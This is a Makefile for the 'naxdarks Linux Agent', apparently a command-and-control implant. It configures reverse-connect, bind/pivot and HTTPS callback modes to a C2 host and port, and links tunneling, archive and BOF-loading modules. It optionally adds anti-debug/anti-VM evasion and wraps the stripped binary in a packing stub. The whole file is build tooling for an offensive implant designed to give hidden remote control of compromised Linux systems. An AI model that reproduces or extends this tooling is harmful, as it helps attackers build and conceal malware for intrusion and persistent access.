# naxdarks Linux Agent — Makefile
#
# CONNECT-OUT mode:
#   make NAX_TCP_MODE=connect \
#        NAX_C2_HOST=10.0.0.1 NAX_C2_PORT=4444 \
#        NAX_AES_KEY=<32hexchars> NAX_LISTENER_WM=0xdeadbeef
#
# BIND / PIVOT mode:
#   make NAX_TCP_MODE=bind \
#        NAX_BIND_PORT=4444 NAX_BIND_HOST=0.0.0.0 \
#        NAX_AES_KEY=<32hexchars> NAX_LISTENER_WM=0xdeadbeef
#
# Add NAX_DEBUG=1 to either for verbose debug output (prints to stderr).
# Add NAX_OPSEC=1 to enable anti-debug/anti-VM.
# The agent is always wrapped with the stub except when NAX_FORMAT=so.

CC           ?= gcc
STRIP        ?= $(patsubst %-gcc,%-strip,$(filter %-gcc,$(CC)))
ifeq ($(STRIP),)
  STRIP      := strip
endif
NAX_AES_KEY     ?= 00000000000000000000000000000000
NAX_LISTENER_WM ?= 0xDEADBEEF
NAX_TCP_MODE    ?= connect
NAX_C2_HOST     ?= 127.0.0.1
NAX_C2_PORT     ?= 4444
NAX_BIND_PORT   ?= 4444
NAX_BIND_HOST   ?= 0.0.0.0
NAX_DEBUG       ?= 0
NAX_FORMAT      ?= elf
NAX_OPSEC       ?= 0
NAX_SLEEP_MS    ?= 5000
NAX_JITTER_PCT  ?= 0
NAX_STUB        ?= 1

STUB_DIR        := src/stub
STUB_SRC        := $(STUB_DIR)/stub.c
STUB_PAYLOAD    := $(STUB_DIR)/stub_payload.h
STUB_GEN        := $(STUB_DIR)/gen_stub_payload.sh

BOF_SDK_DIR := deps/elf-bof
BOF_SDK_INC := $(BOF_SDK_DIR)/include

CFLAGS := -D_GNU_SOURCE -Os -Wall -Wextra -I $(BOF_SDK_INC) \
          -Wno-unused-parameter \
          -Wno-stringop-truncation \
          -Wno-format-truncation \
          -Wno-pointer-to-int-cast \
          -fPIE \
          -fno-builtin \
          -fvisibility=hidden \
          -fstack-protector-strong \
          -Iinclude \
          -DNAX_AES_KEY=\"$(NAX_AES_KEY)\" \
          -DNAX_LISTENER_WM=$(NAX_LISTENER_WM) \
          -DNAX_SLEEP_MS=$(NAX_SLEEP_MS) \
          -DNAX_JITTER_PCT=$(NAX_JITTER_PCT)

LDFLAGS := -pie -Wl,-Bstatic -lpthread -lz -Wl,-Bdynamic -Wl,-z,relro,-z,now -Wl,-z,noexecstack
OUTDIR  := _bin

ifeq ($(CC),aarch64-linux-gnu-gcc)
  BOF_SDK_LIB := $(BOF_SDK_DIR)/lib/libelf_bof_arm64.a
else
  BOF_SDK_LIB := $(BOF_SDK_DIR)/lib/libelf_bof_x64.a
endif

# ===== mode =====
ifeq ($(NAX_TCP_MODE),bind)
  CFLAGS  += -DNAX_TCP_MODE_BIND \
             -DNAX_BIND_PORT=$(NAX_BIND_PORT) \
             -DNAX_BIND_HOST=\"$(NAX_BIND_HOST)\"
  SUFFIX  := _bind
  SRCS    := src/agent.c src/Core/crypto.c src/Core/packer.c \
             src/Core/sysinfo.c src/Commands/commands.c \
             src/Commands/tunnel.c \
             src/Commands/zip.c \
             src/Transport/tcp_bind.c
  LDFLAGS_EXTRA :=
else ifeq ($(NAX_TCP_MODE),https)
  CFLAGS  += -DNAX_HTTPS_MODE \
             -DNAX_C2_HOST=\"$(NAX_C2_HOST)\" \
             -DNAX_C2_PORT=$(NAX_C2_PORT)
  SUFFIX  := _https
  SRCS    := src/agent.c src/Core/crypto.c src/Core/packer.c \
             src/Core/sysinfo.c src/Commands/commands.c \
             src/Commands/tunnel.c \
             src/Commands/zip.c \
             src/Transport/https.c \
             src/Transport/https_profile.c
  ifneq ($(OPENSSL_INC),)
    CFLAGS += -I$(OPENSSL_INC)
  endif
  ifeq ($(CC),aarch64-linux-gnu-gcc)
    OPENSSL_TRIPLET := aarch64-linux-gnu
  else
    OPENSSL_TRIPLET :=
  endif
  ifneq ($(OPENSSL_TRIPLET),)
    CFLAGS       += -I/usr/include/$(OPENSSL_TRIPLET)
    LDFLAGS       = -pie -Wl,-Bstatic -lpthread -lz -Wl,-Bdynamic \
                    -L/usr/lib/$(OPENSSL_TRIPLET) -lssl -lcrypto -Wl,-z,relro,-z,now -Wl,-z,noexecstack
  else
    LDFLAGS       = -pie -Wl,-Bstatic -lpthread -lz -Wl,-Bdynamic -lssl -lcrypto -Wl,-z,relro,-z,now -Wl,-z,noexecstack
  endif
  LDFLAGS_EXTRA :=
else
  CFLAGS  += -DNAX_C2_HOST=\"$(NAX_C2_HOST)\" \
             -DNAX_C2_PORT=$(NAX_C2_PORT)
  SUFFIX  :=
  SRCS    := src/agent.c src/Core/crypto.c src/Core/packer.c \
             src/Core/sysinfo.c src/Commands/commands.c \
             src/Commands/tunnel.c \
             src/Commands/zip.c \
             src/Transport/tcp.c
  LDFLAGS_EXTRA :=
endif

# ===== opsec =====
ifeq ($(NAX_OPSEC),1)
  CFLAGS  += -DNAX_OPSEC=1
  SRCS    += src/Opsec/opsec.c
endif

# ===== stub =====
ifeq ($(NAX_FORMAT),so)
  NAX_STUB := 0
endif

# ===== debug =====
ifeq ($(NAX_DEBUG),1)
  CFLAGS  += -DNAX_DEBUG -g -O0
  SUFFIX  := $(SUFFIX)_debug
endif

# ===== format =====
ifeq ($(NAX_FORMAT),so)
  SRCS   += src/shared.c
  CFLAGS := $(subst -fPIE,-fPIC,$(CFLAGS))
  LDFLAGS := $(subst -pie,-shared,$(LDFLAGS))
  SUFFIX := $(SUFFIX).so
else
  SRCS   += src/main.c
endif

TARGET  := $(OUTDIR)/nax_linux$(SUFFIX)

.PHONY: all clean _build

all: clean
	@$(MAKE) --no-print-directory _build

ifeq ($(NAX_STUB),1)
_build: $(OUTDIR) $(OUTDIR)/.stub_built
else
_build: $(OUTDIR) $(TARGET)
	@echo "[+] Built: $(TARGET)"
endif

# --- 1. Agente ---
$(TARGET): $(SRCS)
	$(CC) $(CFLAGS) $(SRCS) -o $(TARGET) $(BOF_SDK_LIB) $(LDFLAGS) $(LDFLAGS_EXTRA)
ifeq ($(NAX_DEBUG),0)
	$(STRIP) $(TARGET)
endif

$(OUTDIR):
	mkdir -p $(OUTDIR)

# --- 2. Stub (solo si NAX_STUB=1) ---
ifeq ($(NAX_STUB),1)

$(STUB_PAYLOAD): $(TARGET) $(STUB_GEN)
	@echo "[+] Generating stub payload from $(TARGET)"
	@cd $(STUB_DIR) && bash gen_stub_payload.sh ../../$(TARGET) >/dev/null

$(OUTDIR)/.stub_built: $(TARGET) $(STUB_PAYLOAD) $(STUB_SRC)
	@echo "[+] Wrapping $(TARGET) with stub"
	$(CC) $(CFLAGS) $(STUB_SRC) -o $(TARGET)
ifeq ($(NAX_DEBUG),0)
	$(STRIP) $(TARGET)
endif
	@touch $@
	@echo "[+] Built: $(TARGET)"

endif

clean:
	rm -rf $(OUTDIR)
	rm -f $(STUB_PAYLOAD)
